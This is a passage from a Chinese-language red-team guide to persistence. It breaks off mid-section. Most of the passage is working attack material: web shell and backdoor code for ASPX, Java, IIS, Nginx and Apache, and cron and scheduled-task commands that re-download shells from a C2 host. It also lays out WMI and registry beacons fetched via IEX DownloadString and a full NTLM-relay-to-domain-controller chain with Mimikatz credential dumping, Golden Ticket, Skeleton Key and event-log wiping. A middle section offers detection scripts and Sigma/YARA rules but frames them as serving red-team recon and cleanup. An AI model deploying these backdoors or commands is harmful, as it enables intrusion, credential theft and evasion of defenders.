        if (!string.IsNullOrEmpty(cmd)) {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            p.WaitForExit();
            Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
        }
    } else {
        Response.StatusCode = 404;
    }
}

// === ASPX 内存加载（无文件落地） ===
void LoadAssembly() {
    // 从远程加载 .NET assembly 到内存执行
    WebClient wc = new WebClient();
    byte[] assemblyBytes = wc.DownloadData("http://C2_SERVER/payload.dll");
    Assembly assembly = Assembly.Load(assemblyBytes);
    Type type = assembly.GetType("Payload.Program");
    object instance = Activator.CreateInstance(type);
    type.InvokeMember("Run", BindingFlags.InvokeMethod, null, instance, null);
}
</script>
```

### 9.3 JSP / Java 内存马持久化

```java
// === Java Filter 内存马 ===
// 通过动态注册 Filter 实现无文件 WebShell
// 注册到 Tomcat/Jetty/WebLogic 等容器

// Filter 内存马（核心代码）
public class MemShellFilter implements Filter {
    private String password = "R3dT3am@2026";

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;

        String pass = req.getParameter("pass");
        if (password.equals(pass)) {
            String cmd = req.getParameter("cmd");
            if (cmd != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream())
                );
                StringBuilder result = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    result.append(line).append("\n");
                }
                resp.getWriter().write(result.toString());
                return;
            }
        }
        chain.doFilter(request, response);
    }
}

// === 动态注册 Filter（Spring Boot 环境） ===
// 通过反射获取 ApplicationContext 并注册 Filter
public class SpringMemShell {
    public static void inject() {
        // 获取 Spring ApplicationContext
        // 动态注册 Filter 或 Controller
        // 实现无文件、无磁盘落地持久化
    }
}

// === Java Agent 内存马 ===
// 使用 Java Agent 技术，在 JVM 级别注入
// 可拦截所有类加载，实现全局持久化
```

### 9.4 Nginx 模块后门持久化

```nginx
# === Nginx 模块后门 ===
# 通过编译恶意 Nginx 模块实现持久化

# 恶意模块配置
# 在 nginx.conf 中添加
load_module modules/ngx_http_backdoor_module.so;

server {
    listen 80;
    # 特定 URI 触发后门
    location /nginx-status-check {
        # 恶意模块处理此请求
        # 执行命令并返回结果
    }
}
```

```c
// ngx_http_backdoor_module.c - Nginx 后门模块
#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>

static ngx_int_t ngx_http_backdoor_handler(ngx_http_request_t *r) {
    // 检查密码
    ngx_str_t pass = ngx_string("R3dT3am@2026");
    // 接收命令参数
    // 执行命令并返回结果
    // 通过 system() 或 popen() 执行

    ngx_str_t response = ngx_string("OK");
    r->headers_out.status = NGX_HTTP_OK;
    r->headers_out.content_type.len = sizeof("text/plain") - 1;
    r->headers_out.content_type.data = (u_char *) "text/plain";
    ngx_http_send_header(r);
    ngx_http_output_filter(r, (ngx_chain_t *) &response);
    return NGX_OK;
}
```

```bash
# 编译 Nginx 后门模块
# 下载 Nginx 源码，添加恶意模块，重新编译
./configure --add-module=/path/to/backdoor_module
make && make install
```

### 9.5 Apache 模块后门持久化

```c
// mod_backdoor.c - Apache 后门模块
#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"

static int backdoor_handler(request_rec *r) {
    if (strcmp(r->handler, "backdoor")) {
        return DECLINED;
    }
    // 检查请求参数中的密码
    // 执行命令
    // 返回结果
    ap_rputs("OK", r);
    return OK;
}

static void register_hooks(apr_pool_t *p) {
    ap_hook_handler(backdoor_handler, NULL, NULL, APR_HOOK_MIDDLE);
}

module AP_MODULE_DECLARE_DATA backdoor_module = {
    STANDARD20_MODULE_STUFF,
    NULL,
    NULL,
    NULL,
    NULL,
    NULL,
    register_hooks
};
```

```bash
# 编译 Apache 后门模块
apxs -c -i -a mod_backdoor.c
# 重启 Apache
systemctl restart httpd
```

### 9.6 IIS 模块后门持久化

```csharp
// IIS 托管模块后门（C#）
// 实现 IHttpModule 接口
public class BackdoorModule : IHttpModule {
    public void Init(HttpApplication context) {
        context.BeginRequest += new EventHandler(OnBeginRequest);
    }

    private void OnBeginRequest(object sender, EventArgs e) {
        HttpApplication app = (HttpApplication)sender;
        HttpContext ctx = app.Context;

        string pass = ctx.Request.QueryString["pass"];
        if (pass == "R3dT3am@2026") {
            string cmd = ctx.Request.QueryString["cmd"];
            if (!string.IsNullOrEmpty(cmd)) {
                // 执行命令
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c " + cmd;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                ctx.Response.Write(output);
                ctx.Response.End();
            }
        }
    }

    public void Dispose() { }
}
```

```powershell
# 注册 IIS 模块
# 在 web.config 中添加
# <system.webServer>
#   <modules>
#     <add name="BackdoorModule" type="BackdoorModule, BackdoorAssembly" />
#   </modules>
# </system.webServer>

# 或在 applicationHost.config 中全局注册
# C:\Windows\System32\inetsrv\config\applicationHost.config
```

### 9.7 计划任务触发 WebShell

```bash
# === 利用计划任务自动恢复 WebShell ===
# 创建监控脚本，定期检查 WebShell 是否被删除

# Windows 计划任务恢复 WebShell
schtasks /create /tn "WebShellGuard" /tr "powershell.exe -Command \"if (!(Test-Path 'C:\\inetpub\\wwwroot\\config.aspx')) { Invoke-WebRequest -Uri 'http://C2/webshell.aspx' -OutFile 'C:\\inetpub\\wwwroot\\config.aspx' }\"" /sc minute /mo 5 /ru SYSTEM /f

# Linux cron 恢复 WebShell
echo "*/5 * * * * if [ ! -f /var/www/html/modules/cache.php ]; then curl -s http://C2/webshell.php -o /var/www/html/modules/cache.php; fi" >> /etc/crontab
```

### 9.8 定时 HTTP 请求 / 心跳检测

```bash
# === WebShell 心跳检测脚本 ===
# 攻击者侧定期检查 WebShell 是否存活
#!/bin/bash
# webshell_heartbeat.sh
TARGETS=(
    "https://target1.com/shell.php?pass=key"
    "https://target2.com/admin/check.aspx?pass=key"
    "https://target3.com/api/health.jsp?pass=key"
)

for target in "${TARGETS[@]}"; do
    response=$(curl -s -o /dev/null -w "%{http_code}" "$target")
    if [ "$response" != "200" ]; then
        echo "[ALERT] WebShell at $target is DOWN (HTTP $response)"
        # 触发告警或重新部署
    fi
done
```

### 9.9 多级 WebShell 代理

```bash
# === 多级 WebShell 代理链 ===
# Level 1: DMZ Web 服务器
# Level 2: 内网应用服务器
# Level 3: 数据库服务器
# Level 4: 域控

# 使用 WebShell 建立 SOCKS 代理
# 工具：reGeorg, Neo-reGeorg, ABPTTS, tunna

# Neo-reGeorg 示例
python3 neoreg.py -k password -u http://target.com/tunnel.php -p 1080

# 链式代理
# 通过第一个 WebShell 代理访问第二个 WebShell
# 通过第二个 WebShell 代理访问内网
```

---

## 10. 检测与清除

攻防一体，掌握持久化检测技术是红队的必备技能，用于行动前的环境侦察和行动后的痕迹清理。

### 10.1 Autoruns / Sysinternals 检测

```powershell
# === Sysinternals Autoruns ===
# 最全面的 Windows 持久化检测工具
autorunsc.exe -a -c -h -s -v -m > autoruns_report.csv
# 参数说明：
# -a: 所有位置
# -c: CSV 输出
# -h: 显示文件哈希
# -s: 验证数字签名
# -v: 验证签名证书
# -m: 隐藏 Microsoft 条目

# 检查特定类别
autorunsc.exe -a -c -l "Logon" | findstr /v "Microsoft"
autorunsc.exe -a -c -l "Services" | findstr /v "Microsoft"
autorunsc.exe -a -c -l "Scheduled Tasks" | findstr /v "Microsoft"
autorunsc.exe -a -c -l "WMI" | findstr /v "Microsoft"

# === Sysinternals 其他工具 ===
# 检查进程
procexp.exe
# 检查 TCP/UDP 连接
tcpvcon.exe -a -c
# 检查文件签名
sigcheck.exe -a -c C:\Windows\System32\drivers\*.sys
# 检查 ADS
streams.exe -s C:\Windows\System32\
```

### 10.2 持久化检测脚本

**Windows 持久化检测 PowerShell 脚本**：
```powershell
# === 综合持久化检测脚本 ===
function Get-PersistenceArtifacts {
    $results = @()

    # 1. 注册表 Run 键
    $runKeys = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
    )
    foreach ($key in $runKeys) {
        if (Test-Path $key) {
            Get-ItemProperty -Path $key | ForEach-Object {
                $_.PSObject.Properties | Where-Object { $_.Name -ne "PSPath" -and $_.Name -ne "PSParentPath" -and $_.Name -ne "PSChildName" -and $_.Name -ne "PSDrive" -and $_.Name -ne "PSProvider" } | ForEach-Object {
                    $results += [PSCustomObject]@{
                        Type = "Registry Run"
                        Location = $key
                        Name = $_.Name
                        Value = $_.Value
                    }
                }
            }
        }
    }

    # 2. 服务
    Get-CimInstance Win32_Service | Where-Object { $_.StartMode -eq "Auto" -and $_.PathName -notlike "*system32*" -and $_.PathName -notlike "*Program Files*" } | ForEach-Object {
        $results += [PSCustomObject]@{
            Type = "Service"
            Location = $_.Name
            Name = $_.DisplayName
            Value = $_.PathName
        }
    }

    # 3. 计划任务
    Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" } | ForEach-Object {
        $actions = $_.Actions.Execute
        if ($actions) {
            $results += [PSCustomObject]@{
                Type = "Scheduled Task"
                Location = $_.TaskPath + $_.TaskName
                Name = $_.TaskName
                Value = $actions -join "; "
            }
        }
    }

    # 4. WMI 事件订阅
    Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | ForEach-Object {
        $results += [PSCustomObject]@{
            Type = "WMI Subscription"
            Location = "root\subscription"
            Name = $_.Filter.Name
            Value = $_.Consumer.CommandLineTemplate
        }
    }

    # 5. 启动文件夹
    $startupPaths = @(
        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
        "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
    )
    foreach ($path in $startupPaths) {
        if (Test-Path $path) {
            Get-ChildItem $path -ErrorAction SilentlyContinue | ForEach-Object {
                $results += [PSCustomObject]@{
                    Type = "Startup Folder"
                    Location = $path
                    Name = $_.Name
                    Value = $_.FullName
                }
            }
        }
    }

    return $results
}

# 运行检测
$findings = Get-PersistenceArtifacts
$findings | Format-Table -AutoSize
$findings | Export-Csv -Path "persistence_audit.csv" -NoTypeInformation
```

**Linux 持久化检测脚本**：
```bash
#!/bin/bash
# persistence_detector.sh - Linux 持久化检测脚本

echo "=== PERSISTENCE DETECTION REPORT ==="
echo "Host: $(hostname)"
echo "Date: $(date)"
echo ""

# 1. Crontab 检测
echo "[*] Checking crontabs..."
for user in $(cut -f1 -d: /etc/passwd); do
    cron=$(crontab -u $user -l 2>/dev/null)
    if [ ! -z "$cron" ]; then
        echo "  [!] Crontab for $user:"
        echo "$cron" | grep -v "^#" | grep -v "^$"
    fi
done
echo ""

# 2. Systemd 服务检测
echo "[*] Checking systemd services..."
find /etc/systemd/system/ -name "*.service" -newer /etc/passwd 2>/dev/null | while read svc; do
    echo "  [!] Recently modified service: $svc"
    grep -E "ExecStart|ExecStartPre|ExecStartPost" "$svc" 2>/dev/null
done
echo ""

# 3. Shell 配置文件检测
echo "[*] Checking shell profiles..."
for f in /etc/profile /etc/bash.bashrc /etc/bashrc /etc/environment ~/.bashrc ~/.profile ~/.zshrc; do
    if [ -f "$f" ]; then
        suspicious=$(grep -E "(curl|wget|nc|/dev/tcp|nohup|socat)" "$f" 2>/dev/null)
        if [ ! -z "$suspicious" ]; then
            echo "  [!] Suspicious content in $f:"
            echo "$suspicious"
        fi
    fi
done
echo ""

# 4. SSH 密钥检测
echo "[*] Checking SSH authorized_keys..."
for home in /home/* /root; do
    if [ -f "$home/.ssh/authorized_keys" ]; then
        keys=$(wc -l < "$home/.ssh/authorized_keys")
        echo "  [i] $home/.ssh/authorized_keys: $keys keys"
    fi
done
echo ""

# 5. 内核模块检测
echo "[*] Checking kernel modules..."
lsmod | grep -vE "^(Module|usb|hid|pci|scsi|ata|libata|sd_mod|ext4|nfs|tcp|ip|net|nf_)" | while read mod rest; do
    echo "  [i] Loaded module: $mod"
done
echo ""

# 6. LD_PRELOAD 检测
echo "[*] Checking LD_PRELOAD..."
if [ -f /etc/ld.so.preload ]; then
    echo "  [!] /etc/ld.so.preload exists:"
    cat /etc/ld.so.preload
fi
echo "LD_PRELOAD=$LD_PRELOAD"
echo ""

echo "=== SCAN COMPLETE ==="
```

### 10.3 EDR 检测规则 / Sigma 规则

```yaml
# === Sigma 规则示例 ===
# sigma_rules/persistence_registry_run.yml
title: Suspicious Registry Run Key Persistence
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: stable
description: Detects suspicious additions to Run/RunOnce registry keys
author: Red Team
date: 2026/01/01
tags:
    - attack.persistence
    - attack.t1547.001
logsource:
    product: windows
    service: security
    category: registry_event
detection:
    selection:
        EventID: 4657
        TargetObject|contains:
            - '\Software\Microsoft\Windows\CurrentVersion\Run'
            - '\Software\Microsoft\Windows\CurrentVersion\RunOnce'
    filter:
        Image|contains:
            - 'C:\Program Files\'
            - 'C:\Windows\System32\'
    condition: selection and not filter
falsepositives:
    - Legitimate software installations
level: medium

---
# sigma_rules/wmi_persistence.yml
title: WMI Event Subscription Persistence
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: stable
description: Detects creation of WMI Event Subscriptions for persistence
tags:
    - attack.persistence
    - attack.t1546.003
logsource:
    product: windows
    service: wmi
    category: event
detection:
    selection:
        EventID: 5861
    condition: selection
level: high

---
# sigma_rules/schtasks_persistence.yml
title: Suspicious Scheduled Task Creation
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: stable
description: Detects creation of scheduled tasks with suspicious command lines
tags:
    - attack.persistence
    - attack.t1053.005
logsource:
    product: windows
    service: security
    category: process_creation
detection:
    selection:
        EventID: 4698
    suspicious_cmd:
        CommandLine|contains:
            - 'powershell -enc'
            - 'IEX('
            - 'DownloadString'
            - 'FromBase64String'
    condition: selection and suspicious_cmd
level: high
```

### 10.4 YARA 规则

```yara
// === YARA 规则：持久化工具检测 ===
rule persistence_sharpersist {
    meta:
        description = "Detects SharPersist persistence tool"
        author = "Red Team"
        date = "2026-01-01"
        severity = "high"

    strings:
        $s1 = "SharPersist" ascii wide
        $s2 = "schtaskbackdoor" ascii wide
        $s3 = "startupfolder" ascii wide
        $s4 = "KeepAlive" ascii wide
        $s5 = "NewService" ascii wide

    condition:
        uint16(0) == 0x5A4D and 2 of them
}

rule persistence_powersploit {
    meta:
        description = "Detects PowerSploit Persistence module"
        author = "Red Team"
        date = "2026-01-01"

    strings:
        $s1 = "Persistence" ascii wide
        $s2 = "Install-Persistence" ascii wide
        $s3 = "Get-PersistenceWMI" ascii wide
        $s4 = "New-UserPersistence" ascii wide

    condition:
        filesize < 10MB and 2 of them
}

rule persistence_rootkit_lkm {
    meta:
        description = "Detects Linux kernel module rootkit signatures"
        author = "Red Team"
        date = "2026-01-01"

    strings:
        $s1 = "sys_call_table" ascii
        $s2 = "hooked_getdents" ascii
        $s3 = "commit_creds" ascii
        $s4 = "prepare_kernel_cred" ascii
        $s5 = "hide_module" ascii

    condition:
        uint32(0) == 0x464c457f and 3 of them
}
```

### 10.5 内存取证

```bash
# === 内存取证工具链 ===
# Volatility 3
python3 vol.py -f memory.dump windows.psscan
python3 vol.py -f memory.dump windows.dlllist
python3 vol.py -f memory.dump windows.malfind
python3 vol.py -f memory.dump windows.ssdt  # 检查 SSDT 钩子

# Linux 内存取证
python3 vol.py -f memory.dump linux.pslist
python3 vol.py -f memory.dump linux.check_syscall
python3 vol.py -f memory.dump linux.lsmod
python3 vol.py -f memory.dump linux.hidden_modules

# Rekall
rekall -f memory.dump pslist
rekall -f memory.dump dlllist
rekall -f memory.dump ssdt

# 内存 dump 采集工具
# Windows: winpmem, DumpIt, Magnet RAM Capture
# Linux: LiME, fmem, avml
# 或通过虚拟机快照获取 .vmem 文件
```

### 10.6 持久化清除工具

```powershell
# === Windows 持久化清除脚本 ===
function Remove-Persistence {
    param(
        [string]$ArtifactType,
        [string]$ArtifactName
    )

    switch ($ArtifactType) {
        "RegistryRun" {
            Remove-ItemProperty -Path $ArtifactName -Name $ArtifactName -ErrorAction SilentlyContinue
        }
        "Service" {
            sc.exe stop $ArtifactName
            sc.exe delete $ArtifactName
        }
        "ScheduledTask" {
            Unregister-ScheduledTask -TaskName $ArtifactName -Confirm:$false -ErrorAction SilentlyContinue
        }
        "WMI" {
            Get-WmiObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='$ArtifactName'" | Remove-WmiObject
            Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer -Filter "Name='$ArtifactName'" | Remove-WmiObject
        }
        "StartupFolder" {
            Remove-Item -Path $ArtifactName -Force -ErrorAction SilentlyContinue
        }
    }
}
```

```bash
# === Linux 持久化清除脚本 ===
#!/bin/bash
# persistence_cleanup.sh

# 清除 crontab
echo "[*] Cleaning crontabs..."
crontab -r 2>/dev/null
rm -f /etc/cron.d/.system-update /etc/cron.d/malicious /etc/cron.daily/*.bak

# 清除 systemd 服务
echo "[*] Removing systemd services..."
systemctl stop systemd-networkd-helper.service 2>/dev/null
systemctl disable systemd-networkd-helper.service 2>/dev/null
rm -f /etc/systemd/system/systemd-networkd-helper.service

# 清除 shell 配置
echo "[*] Cleaning shell profiles..."
sed -i '/\/tmp\/\.payload/d' /etc/profile /etc/bash.bashrc ~/.bashrc ~/.profile 2>/dev/null

# 清除 SSH 密钥
echo "[*] Removing unauthorized SSH keys..."
# 保留已知合法密钥，删除其他

# 清除内核模块
echo "[*] Removing kernel modules..."
rmmod rootkit 2>/dev/null
rm -f /etc/modules-load.d/rootkit.conf
rm -f /lib/modules/$(uname -r)/kernel/drivers/rootkit.ko

# 清除 LD_PRELOAD
echo "[*] Removing LD_PRELOAD persistence..."
rm -f /etc/ld.so.preload
unset LD_PRELOAD

echo "[*] Cleanup complete."
```

---

## 11. 自动化工具链

红队实战中，持久化操作需要自动化以提高效率。本节汇总主流持久化工具及其使用方法。

### 11.1 SharPersist

SharPersist 是 FireEye 开发的 Windows 持久化工具包，支持多种持久化技术。

```powershell
# === SharPersist 安装 ===
# 从 GitHub 下载或编译
# https://github.com/fireeye/SharPersist

# === SharPersist 基本用法 ===
# 列出所有持久化项
SharPersist.exe -t reg -c list

# 添加注册表 Run 键持久化
SharPersist.exe -t reg -c add -k "hkcurun" -v "WindowsUpdate" -m command -a "C:\Windows\Temp\payload.exe"

# 添加计划任务持久化
SharPersist.exe -t schtaskbackdoor -c add -n "SystemHealth" -m command -a "powershell.exe -enc BASE64" -o daily

# 添加启动文件夹持久化
SharPersist.exe -t startupfolder -c add -n "OneDriveSync" -m command -a "C:\Windows\Temp\payload.exe"

# 添加 WMI 事件订阅持久化
SharPersist.exe -t wmi -c add -n "WindowsUpdateFilter" -m command -a "powershell.exe -enc BASE64"

# 添加服务持久化
SharPersist.exe -t service -c add -n "WinUpdate" -m command -a "C:\Windows\Temp\payload.exe"

# 清理
SharPersist.exe -t reg -c remove -k "hkcurun" -v "WindowsUpdate"
SharPersist.exe -t all -c cleanup
```

### 11.2 PowerSploit Persistence

```powershell
# === PowerSploit Persistence 模块 ===
# 下载并导入
IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Persistence/Persistence.psm1")

# 用户级持久化
Add-Persistence -FilePath "C:\Windows\Temp\payload.exe" -LocalUser -Startup

# 注册表持久化
Add-Persistence -FilePath "C:\Windows\Temp\payload.exe" -RegistryKey "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -RegistryValue "UpdateService"

# WMI 持久化
Add-Persistence -FilePath "C:\Windows\Temp\payload.exe" -WMI -Startup

# 计划任务持久化
Add-Persistence -FilePath "C:\Windows\Temp\payload.exe" -ScheduledTask -TaskName "SystemHealth" -Daily -At "09:00"

# 查看持久化
Get-Persistence

# 移除持久化
Remove-Persistence -Type All
```

### 11.3 PowerView 持久化

```powershell
# === PowerView 域持久化 ===
# 下载并导入
IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")

# 添加域用户
New-DomainUser -SamAccountName "svc_backup" -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) -Name "Backup Service" -Enabled $true

# 添加到域管理员组
Add-DomainGroupMember -Identity "Domain Admins" -Members "svc_backup"

# 创建域控持久化
# 1. Golden Ticket 攻击
# 2. DCSync 权限
# 3. Skeleton Key
# 4. AdminSDHolder
```

### 11.4 SharpStay

```powershell
# === SharpStay 持久化 ===
# SharpStay 是 .NET 持久化工具合集
# execute-assembly SharpStay.exe

# 列出所有可用的持久化技术
SharpStay.exe list

# 注册表 Run 键
SharpStay.exe action=RegistryKey key=HKCU:Run name=Updater command="C:\Windows\Temp\payload.exe"

# 计划任务
SharpStay.exe action=ScheduledTask taskname=SystemHealth command="powershell.exe -enc BASE64" trigger=logon

# 服务
SharpStay.exe action=Service servicename=WinUpdate displayname="Windows Update" command="C:\Windows\Temp\payload.exe"

# WMI
SharpStay.exe action=WMI eventname=SystemStartup command="C:\Windows\Temp\payload.exe"

# 启动文件夹
SharpStay.exe action=StartupFolder name=OneDriveHelper command="C:\Windows\Temp\payload.exe"
```

### 11.5 Hidden / Totem

```bash
# === Hidden - Linux 持久化工具 ===
# 安装
git clone https://github.com/JKlib/Hidden.git
cd Hidden

# 创建反向 shell 持久化
python3 hidden.py --type reverse_shell --host C2_IP --port 4444 --persistence crontab

# 创建 SSH 密钥持久化
python3 hidden.py --type ssh_key --key /path/to/public_key --persistence authorized_keys

# 创建 systemd 持久化
python3 hidden.py --type systemd --command "/tmp/payload" --persistence service

# === Totem - macOS 持久化工具 ===
# Totem 专注于 macOS LaunchAgent/LaunchDaemon 持久化
```

### 11.6 LaZagne Persistence

```bash
# === LaZagne 持久化模块 ===
# LaZagne 支持凭据提取后的持久化
python3 lazagne.py all

# 提取凭据后，使用 persistence 模块建立持久化
# 支持 Windows/Linux/macOS 多平台
```

---

## 12. 实战案例：完整持久化链

本节展示一个完整的红队实战案例，从 NTLM 中继到域控持久化的全链路攻击。

### 12.1 攻击链概述

```
Phase 1: NTLM 中继 → 初始立足点
Phase 2: RCE → 提权 → 凭据提取
Phase 3: 多级持久化部署
Phase 4: C2 上线 → 横向移动
Phase 5: 域控持久化
```

### 12.2 Phase 1: NTLM 中继获取初始立足点

```bash
# === 步骤 1: NTLM 中继攻击 ===
# 使用 Responder 捕获 NTLM 哈希
responder -I eth0 -wrf

# 使用 ntlmrelayx 中继到目标
ntlmrelayx.py -t smb://TARGET_IP -smb2support -c "powershell -enc BASE64"

# 或中继到 LDAP 添加域用户
ntlmrelayx.py -t ldap://DC_IP --escalate-user svc_backup

# === 步骤 2: 获取初始 shell ===
# 通过中继获得 SYSTEM 权限的 shell 或添加的域用户
# 使用 secretsdump 提取凭据
secretsdump.py DOMAIN/svc_backup:'P@ssw0rd!'@DC_IP
```

### 12.3 Phase 2: RCE 与凭据提取

```powershell
# === 步骤 3: 远程代码执行 ===
# 使用 wmiexec 或 psexec 获取 shell
wmiexec.py DOMAIN/Administrator@TARGET_IP -hashes :NTLM_HASH

# === 步骤 4: 凭据提取 ===
# 在目标主机上执行 Mimikatz
# 注意：2026 年 Credential Guard 和 LSA Protection 广泛部署
# 需要绕过这些保护

# 方法 1: 使用 Mimikatz 的 SSP 注入
mimikatz # privilege::debug
mimikatz # misc::memssp

# 方法 2: 使用 SharpKatz（.NET 版本的 Mimikatz）
execute-assembly SharpKatz.exe --Command "logonpasswords"

# 方法 3: 使用 DCSync 从域控提取凭据
mimikatz # lsadump::dcsync /domain:DOMAIN.local /user:krbtgt

# 方法 4: 提取 LSASS 进程内存
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# 离线分析
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### 12.4 Phase 3: 多级持久化部署

```powershell
# === 步骤 5: 部署多层持久化 ===

# Layer 1: 注册表 Run 键（快速恢复）
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\System32\mshta.exe http://C2_SERVER/beacon.hta" /f

# Layer 2: WMI 事件订阅（深度隐蔽）
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "WindowsUpdateFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "WindowsUpdateConsumer"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://C2_SERVER/beacon.ps1')"
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# Layer 3: 计划任务（定时触发）
schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\HealthCheck" /xml "C:\Windows\Temp\sched_task.xml" /f

# Layer 4: 服务持久化（SYSTEM 权限）
sc create "WinUpdateSvc" binPath="C:\Windows\System32\svchost.exe -k netsvcs -p" start=auto
# 配合 svchost 服务劫持，将恶意 DLL 注入到 netsvcs 组

# Layer 5: COM 劫持（隐蔽触发）
New-Item -Path "HKCU:\Software\Classes\CLSID\{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}" -Force
New-Item -Path "HKCU:\Software\Classes\CLSID\{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{0F87369F-A4E5-4CFC-BD3E-73E6154572DD}\InprocServer32" -Name "(Default)" -Value "C:\Windows\System32\payload.dll"
```

### 12.5 Phase 4: C2 上线与横向移动

```powershell
# === 步骤 6: C2 上线 ===
# 在 Cobalt Strike 中收到 beacon 回调
# 配置 SMB 或 TCP 监听器用于内网横向

# === 步骤 7: 内网侦察 ===
# 使用 BloodHound 收集域信息
execute-assembly SharpHound.exe -c All -d DOMAIN.local

# 使用 PowerView 枚举
IEX(New-Object Net.WebClient).DownloadString("http://C2/powerview.ps1")
Get-DomainUser -Properties samaccountname, memberof, serviceprincipalname
Get-DomainComputer -Properties dnshostname, operatingsystem
Get-DomainGroupMember -Identity "Domain Admins"

# === 步骤 8: 横向移动 ===
# 方式 1: PSExec
beacon> jump psexec64 TARGET_HOST SMB_Listener

# 方式 2: WMI
beacon> jump winrm64 TARGET_HOST SMB_Listener

# 方式 3: 通过提取的凭据
beacon> make_token DOMAIN\Administrator P@ssw0rd!
beacon> jump psexec64 DC01 SMB_Listener

# 方式 4: Kerberos 票据攻击
beacon> execute-assembly Rubeus.exe kerberoast /format:hashcat
beacon> execute-assembly Rubeus.exe asreproast /format:hashcat
```

### 12.6 Phase 5: 域控持久化

```powershell
# === 步骤 9: 域控持久化 ===

# 方式 1: Golden Ticket（黄金票据）
# 需要 krbtgt 的 NTLM 哈希
mimikatz # kerberos::golden /domain:DOMAIN.local /sid:S-1-5-21-XXXXX /krbtgt:NTLM_HASH /user:Administrator /id:500 /ptt

# 方式 2: DCSync 权限
# 为特定用户添加 DCSync 权限
Add-DomainObjectAcl -TargetIdentity "DC=DOMAIN,DC=local" -PrincipalIdentity "svc_backup" -Rights DCSync

# 方式 3: Skeleton Key（万能钥匙）
# 在域控上注入 Skeleton Key
mimikatz # privilege::debug
mimikatz # misc::skeleton
# 然后任何域用户都可以用密码 "mimikatz" 登录

# 方式 4: AdminSDHolder 持久化
# 将恶意用户添加到 AdminSDHolder 的 ACL 中
# SDProp 会定期将 AdminSDHolder 的 ACL 同步到所有受保护组
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=local" -PrincipalIdentity "svc_backup" -Rights All

# 方式 5: DCShadow
# 创建伪装的域控，向真实域控注入恶意数据
mimikatz # lsadump::dcshadow /object:svc_backup /attribute:primaryGroupID /value:512

# 方式 6: 域控上的 WMI 持久化
# 在域控上创建 WMI 事件订阅，每 5 分钟检查一次 C2 状态
# 如果 C2 连接断开，自动重新建立

# 方式 7: 域控计划任务
schtasks /create /tn "Microsoft\Windows\ActiveDirectory\ADHealthCheck" /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://C2/beacon.ps1')" /sc minute /mo 10 /ru SYSTEM /s DC01 /f

# === 步骤 10: 验证持久化 ===
# 模拟重启后验证
# 1. 检查所有持久化层是否正常
# 2. 验证 C2 通信是否恢复
# 3. 确认凭据仍然有效
# 4. 测试横向移动路径是否可用

# === 步骤 11: 清理痕迹 ===
# 清理事件日志
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# 清理 Prefetch
